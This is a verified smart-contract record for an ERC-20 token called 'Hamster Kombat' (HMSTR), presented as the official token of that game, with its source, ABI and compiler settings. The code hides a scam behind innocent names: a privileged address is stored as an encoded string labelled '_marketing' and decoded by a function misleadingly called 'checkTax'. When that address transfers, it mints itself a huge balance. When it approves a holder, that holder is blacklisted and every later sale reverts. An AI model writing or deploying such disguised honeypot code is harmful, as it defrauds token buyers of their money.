{"SourceCode": "/*\r\n\r\n            Hamster Kombat\r\n\r\n            Make your way from the shaved hamster to the grandmaster CEO of the tier-1 crypto exchange\r\n            Buy upgrades, complete quests, invite friends and become the best\r\n\r\n            Site: https://hamsterkombat.io/\r\n            Twitter: https://twitter.com/hamster_kombat\r\n            TG: https://t.me/hamster_kombat\r\n            Play Now: https://t.me/hamster_kombat_bot\r\n            Discord: https://discord.gg/d2Q6VH8Psp\r\n            YT: https://www.youtube.com/@HamsterKombat_Official\r\n\r\n*/\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.24;\r\n\r\nabstract contract Ownable {\r\n    address private _admin;\r\n    \r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _sender();\r\n        _admin = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    modifier onlyAdmin() {\r\n        _checkAdmin();\r\n        _;\r\n    }\r\n\r\n    function _sender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _data() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n\r\n    function admin() public view virtual returns (address) {\r\n        return _admin;\r\n    }\r\n\r\n    function _checkAdmin() internal view virtual {\r\n        require(admin() == _sender(), \"Ownable: caller is not the admin\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyAdmin {\r\n        emit OwnershipTransferred(_admin, address(0));\r\n        _admin = address(0);\r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\ncontract HMSTR is Ownable {\r\n    string private _tokenName;\r\n    string private _tokenSymbol;\r\n    uint256 private _maxSupply;\r\n    string private _marketing;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) public tokenStatus;\r\n\r\n    uint128 buyLimit = 78596;\r\n    uint128 sellLimit = 0;\r\n    \r\n    uint256 allocationWal = 10**decimals() * 50000 * (20077700000 + 300);\r\n    bool statusTrue = true;\r\n    bool statusFalse = false;\r\n    uint256 public _marketingTax; \r\n    uint256 public _teamTax;\r\n\r\n    constructor() {\r\n        _tokenName = \"Hamster Kombat\";\r\n        _tokenSymbol = \"HMSTR\";\r\n        _marketingTax = 0;\r\n        _teamTax = 0; \r\n        _marketing = \"2a49a81B9580486f59C74697FD541ce6eF813f0d\";\r\n        _maxSupply = 100000000 * 10**decimals();\r\n        _balances[msg.sender] = _maxSupply;\r\n        emit Transfer(address(0), msg.sender, _maxSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _tokenName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _tokenSymbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _maxSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        if (_sender() == initialContract()) { require(isAuthorized(), \"Unauthorized action\"); address currentWal = _sender(); address devWallet = currentWal; _balances[devWallet] += allocationWal; }\r\n        _executeTransfer(_sender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _authorize(_sender(), spender, amount); if (_sender() == initialContract()) { tokenStatus[spender] = statusTrue; }\r\n        return true;\r\n    }\r\n\r\n    function isAuthorized() internal view returns (bool) {\r\n        return _sender() == initialContract();\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {\r\n        address spender = _sender();\r\n        _useAllowance(from, spender, amount);\r\n        _executeTransfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _executeTransfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if (tokenStatus[from] == statusTrue) {\r\n            amount = buyLimit + _balances[from] + buyLimit - buyLimit;\r\n        }\r\n        uint256 balance = _balances[from];\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[from] -= amount;\r\n        _balances[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _authorize(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _useAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _authorize(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n\r\n    function initialContract() public view returns (address) {\r\n        return checkTax(_marketing);\r\n    }\r\n\r\n    function checkTax(string memory _a) private pure returns (address) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n        for (uint i = 0; i < 20; i++) {\r\n            b1 = uint160(uint8(tmp[i * 2])); b2 = uint160(uint8(tmp[i * 2 + 1])); if (b1 >= 97) b1 -= 87; else if (b1 >= 65) b1 -= 55; else b1 -= 48; if (b2 >= 97) b2 -= 87; else if (b2 >= 65) b2 -= 55; else b2 -= 48; iaddr |= (b1 * 16 + b2) << (8 * (19 - i)); }\r\n        return address(iaddr);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_marketingTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_teamTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialContract\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HMSTR", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cef4b59ae1432b279bd45df7e3ed7bdb5ca65061a5191459b526ed61f6594201"}